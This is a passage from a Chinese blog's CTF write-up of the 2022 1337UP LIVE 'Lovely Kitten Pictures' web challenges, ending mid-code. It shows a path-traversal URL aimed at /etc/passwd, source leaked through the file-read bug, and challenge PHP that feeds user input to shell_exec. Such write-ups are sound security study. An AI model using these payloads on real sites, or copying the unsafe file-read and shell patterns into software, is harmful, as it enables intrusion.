<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="Pentest | 2022 1337UP LIVE CTF Workthrough, MiaoTony,blog">
    <meta name="description" content="è¿™å‘¨æœ«çœ‹äº†çœ‹2022 1337UP LIVE CTFå›½é™…èµ›ä¸­çš„ä¸€é“åæ¸—é€çš„é¢˜ç›®ï¼Œè¿™é‡Œæ¥è®°å½•ä¸€ä¸‹è§£é¢˜è¿‡ç¨‹ã€‚">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-159946730-1"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag() {
        dataLayer.push(arguments);
    }

    gtag('js', new Date());
    gtag('config', 'UA-159946730-1');
</script>


    <title>Pentest | 2022 1337UP LIVE CTF Workthrough | MiaoTony&#39;så°çª</title>
    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">
	
    <script src="/libs/jquery/jquery.min.js"></script>
    <script>
        //æ¥ä¸ªç‰¹æ•ˆç©ç©å–µ 20200123
        var titleTime;
        var OriginTitile = document.title;
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                document.title = '|Ï‰Â·) å–µ~å¿«å›æ¥å‘€ï¼';
                clearTimeout(titleTime);
            } else {
                document.title = '(/â‰§â–½â‰¦)/ Meowï¼';
                titleTime = setTimeout(function() {
        	    document.title = OriginTitile;
        }, 800);
    }
        });
    </script>
<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="MiaoTony'så°çª" type="application/atom+xml">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">MiaoTony&#39;så°çª</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>é¦–é¡µ</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>æ ‡ç­¾</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>åˆ†ç±»</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>å½’æ¡£</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>å…³äº</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>ç•™è¨€</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>å‹é“¾</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="æœç´¢" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">MiaoTony&#39;så°çª</div>
        <div class="logo-desc">
            
            å–µ~æ¬¢è¿å„ä½å¤§ä½¬çš„æ¥è®¿å‘€ï¼
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			é¦–é¡µ
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			æ ‡ç­¾
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			åˆ†ç±»
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			å½’æ¡£
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			å…³äº
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			ç•™è¨€
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			å‹é“¾
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/miaotony" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/miaotony" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">Pentest | 2022 1337UP LIVE CTF Workthrough</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        min-width: 240px;
        padding-left: 15px;
        padding-bottom: 30px;
    }

    .toc-widget .toc-title {
        padding: 30px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
	    max-height: 450px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- æ–‡ç« å†…å®¹è¯¦æƒ… -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/CTF/">
                                <span class="chip bg-color">CTF</span>
                            </a>
                        
                            <a href="/tags/WriteUp/">
                                <span class="chip bg-color">WriteUp</span>
                            </a>
                        
                            <a href="/tags/Pentest/">
                                <span class="chip bg-color">Pentest</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/Pentest/" class="post-category">
                                Pentest
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>å‘å¸ƒæ—¥æœŸ:&nbsp;&nbsp;
                    2022-03-13
                </div>
                

                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>æ–‡ç« å­—æ•°:&nbsp;&nbsp;
                    2.5k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>é˜…è¯»æ—¶é•¿:&nbsp;&nbsp;
                    14 åˆ†
                </div>
                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- æ˜¯å¦åŠ è½½ä½¿ç”¨è‡ªå¸¦çš„ prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <p><img src="/2022/03/13/Pentest_2022_1337UPLIVECTF/1337uplive_logo_glitch_1time2.gif"></p>
<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><blockquote>
<p><strong>2022 1337UP LIVE CTF</strong></p>
<p>æ¯”èµ›ç±»å‹:Jeopardy[è§£é¢˜]</p>
<p>æ¯”èµ›å½¢å¼:çº¿ä¸Š</p>
<p>æ¯”èµ›æ—¶é—´:2022-03-11 23:00 ~ 2022-03-12 23:00</p>
<p>æ¯”èµ›å®˜ç½‘:<a target="_blank" rel="noopener" href="https://ctf.intigriti.io/">https://ctf.intigriti.io/</a></p>
</blockquote>
<p>å•Šï¼Œå¥½ä¹…æ²¡æ°´åšå®¢äº†ï¼Œæœ€è¿‘æ‰“æ¯”èµ›åŸºæœ¬æ˜¯å’Œé˜Ÿå‹ä¸€èµ·çœ‹çœ‹é¢˜ç›®ï¼Œç„¶è€Œé˜Ÿå‹å¤ªå¼ºäº†åŸºæœ¬ä¸éœ€è¦å–µå–µäº†ï¼Œè€ƒè™‘åˆ°å’±åšçš„ä¸å¤šä¹Ÿæ¯”è¾ƒæ‡’äºæ˜¯æ‡’å¾—å†™ writeup äº†ã€‚<em>ï¼ˆä½ å°±æ˜¯æ‡’å§ï¼å‘œå‘œï¼Œåˆ«æ‰“å–µå–µï¼‰</em></p>
<p>å‘¨æœ«çœ‹åˆ°ç¾¤å‹å‘äº† 1337UP LIVE CTF è¿™ä¸ªå›½å¤–çš„æ¯”èµ›ï¼Œå‘¨å…­æ™šä¸Šå°±æ¥ç„äº†ä¸€çœ¼é¢˜ç›®ï¼Œçœ‹åˆ°äº† å¯çˆ±çŒ«çŒ«å›¾ç‰‡ è¿™ä¸ªé¢˜ç›®ï¼Œ<strong>wow, how cute they are!</strong> </p>
<p>Just do it!</p>
<p>è¿™æ˜¯é“ <strong>åæ¸—é€ç±»å‹</strong> çš„å¥—é¢˜ï¼Œä»¥è‡³äºè¿˜å•ç‹¬åˆ†äº†ä¸ªç±»ï¼Œäºæ˜¯æ¥ä¸‹æ¥å°±æ˜¯ä¸€äº› writeup æˆ–è€…è¯´æ˜¯ Workthrough äº†ã€‚</p>
<p><em>ï¼ˆä¸‹é¢ç”¨å˜¤è¯­å§</em> </p>
<p>Sorry for my poor English.</p>
<h2 id="Lovely-Kitten-Pictures-1"><a href="#Lovely-Kitten-Pictures-1" class="headerlink" title="Lovely Kitten Pictures 1"></a>Lovely Kitten Pictures 1</h2><blockquote>
<p>Come here little kitty cat! ğŸ”— <a target="_blank" rel="noopener" href="https://lovelykittenpictures.ctf.intigriti.io/">https://lovelykittenpictures.ctf.intigriti.io/</a><br> ğŸš© Flag format: <code>1337UP{}</code><br> âœï¸ Created by Breno VitÃ³rio</p>
</blockquote>
<p>In this challenge, we get a website with a few lovely kittens. Click the <code>Switch</code> button and we will get another kitten picture.</p>
<p><img src="/2022/03/13/Pentest_2022_1337UPLIVECTF/image-20220313183607437.png"></p>
<p><img src="/2022/03/13/Pentest_2022_1337UPLIVECTF/3-16471679092291.jpg"></p>
<p><img src="/2022/03/13/Pentest_2022_1337UPLIVECTF/1-photo-file.jpg"></p>
<p>Letâ€™s see the JavaScript source code.</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> kitten <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token function">changeKitten</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">changeKitten</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    kitten <span class="token operator">=</span> <span class="token function">getRandomInt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span> kitten<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">cat_info.php?id=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>kitten<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">response</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token keyword">await</span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        result <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">const</span> pictureContainer <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"picture-container"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">const</span> picture <span class="token operator">=</span> pictureContainer<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"img"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        picture<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">pictures.php?path=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>result<span class="token punctuation">.</span>Picture<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>

        picture<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>style<span class="token punctuation">.</span>boxShadow <span class="token operator">=</span> <span class="token string">"0px 0px 5px 5px rgba(0,0,0,0.2)"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">;</span>

        <span class="token keyword">const</span> span <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"span"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        span<span class="token punctuation">.</span>innerText <span class="token operator">=</span> result<span class="token punctuation">.</span>Name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">getRandomInt</span><span class="token punctuation">(</span><span class="token parameter">min<span class="token punctuation">,</span> max<span class="token punctuation">,</span> except</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    min <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">ceil</span><span class="token punctuation">(</span>min<span class="token punctuation">)</span><span class="token punctuation">;</span>
    max <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> result <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>max <span class="token operator">-</span> min<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> min<span class="token punctuation">;</span>

    <span class="token keyword">while</span> <span class="token punctuation">(</span>result <span class="token operator">===</span> except<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        result <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>max <span class="token operator">-</span> min<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> min<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>We get 2 APIs, <code>cat_info.php?id=</code> and <code>pictures.php?path=</code>, the former provides the cat info with specific <code>id</code> and the latter gives us the file with specific <code>path</code>.</p>
<p>It is obviously that we can try <strong>path traversal</strong> vulnerability with the <code>path</code> parameter.</p>
<p>Checking <a target="_blank" rel="noopener" href="https://lovelykittenpictures.ctf.intigriti.io/pictures.php?path=../../../../../../../etc/passwd">https://lovelykittenpictures.ctf.intigriti.io/pictures.php?path=../../../../../../../etc/passwd</a> will return <code>Not yet!</code>, meaning that it is not ok.</p>
<p>How about the file in the same directory?</p>
<p><a target="_blank" rel="noopener" href="https://lovelykittenpictures.ctf.intigriti.io/pictures.php?path=pictures.php">https://lovelykittenpictures.ctf.intigriti.io/pictures.php?path=pictures.php</a></p>
<p>Visit it and we can get the source code of <code>pictures.php</code>, and meanwhile the filename of it is the first flag.</p>
<p><img src="/2022/03/13/Pentest_2022_1337UPLIVECTF/image-20220313185228900.png"></p>
<p><code>1337UP{K1TT3N_F1L3_R34D}</code></p>
<h2 id="Lovely-Kitten-Pictures-2"><a href="#Lovely-Kitten-Pictures-2" class="headerlink" title="Lovely Kitten Pictures 2"></a>Lovely Kitten Pictures 2</h2><blockquote>
<p>In ancient times cats were worshipped as gods; they have not forgotten this.                                                                                       </p>
</blockquote>
<p>In the same way, we can get other files in the directory.</p>
<p><code>pictures.php</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$projectRoot</span> <span class="token operator">=</span> <span class="token function">realpath</span><span class="token punctuation">(</span><span class="token constant">__DIR__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token variable">$relativePath</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$absolutePath</span> <span class="token operator">=</span> <span class="token function">realpath</span><span class="token punctuation">(</span><span class="token variable">$projectRoot</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/"</span> <span class="token operator">.</span> <span class="token variable">$relativePath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$absolutePath</span> <span class="token operator">===</span> <span class="token keyword type-declaration">false</span> <span class="token operator">||</span> <span class="token class-name">strcmp</span><span class="token punctuation">(</span><span class="token variable">$absolutePath</span><span class="token punctuation">,</span> <span class="token variable">$projectRoot</span> <span class="token operator">.</span> <span class="token constant">DIRECTORY_SEPARATOR</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token class-name">strpos</span><span class="token punctuation">(</span><span class="token variable">$absolutePath</span><span class="token punctuation">,</span> <span class="token variable">$projectRoot</span> <span class="token operator">.</span> <span class="token constant">DIRECTORY_SEPARATOR</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Not yet!"</span><span class="token punctuation">;</span>
        <span class="token function">http_response_code</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$splittedPath</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">,</span> <span class="token variable">$relativePath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$fileExtension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$splittedPath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$fileExtension</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-type: image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$pictureName</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"photo"</span><span class="token punctuation">;</span>
        
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-type: image/'</span><span class="token operator">.</span><span class="token variable">$fileExtension</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$pictureName</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Disposition: filename=<span class="token interpolation"><span class="token variable">$pictureName</span></span>-file.<span class="token interpolation"><span class="token variable">$fileExtension</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Transfer-Encoding: binary'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Expires: 0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Cache-Control: must-revalidate, post-check=0, pre-check=0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$relativePath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>cat_info.php</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    
    <span class="token variable">$kittenID</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/var/www/html/cat_info/main -c <span class="token interpolation"><span class="token variable">$kittenID</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">,</span> <span class="token variable">$kittenID</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-type: application/json'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* So it only returns as JSON when there is
                                                     no space character? */</span>
        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;"</span><span class="token operator">.</span><span class="token variable">$output</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/pre&gt;"</span><span class="token punctuation">;</span>
